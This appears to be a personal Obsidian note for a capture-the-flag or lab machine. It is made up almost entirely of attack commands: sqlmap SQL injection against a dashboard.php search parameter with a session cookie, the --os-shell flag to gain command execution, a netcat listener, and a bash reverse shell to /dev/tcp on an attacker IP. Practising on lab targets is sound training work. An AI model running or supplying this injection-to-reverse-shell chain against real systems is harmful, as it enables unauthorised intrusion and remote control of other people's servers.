```
sqlmap -h
```

Use cookie-editor browser add-on

![[Pasted image 20250528034840.png]]

```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = ` sqlmap -u 'http://${ip}/dashboard.php?search=any+query' --cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1"`;

dv.paragraph("```bash\n" + command + "\n```");
```

add flag --os-shell
```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = ` sqlmap -u 'http://${ip}/dashboard.php?search=any+query' --cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1" --os-shell`;

dv.paragraph("```bash\n" + command + "\n```");
```
turn on netcat

```
sudo nc -lvnp 443
```

upgrade shell
```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = `bash -c "bash -i >& /dev/tcp/[kaliIP]/443 0>&1"`;

dv.paragraph("```bash\n" + command + "\n```");
```
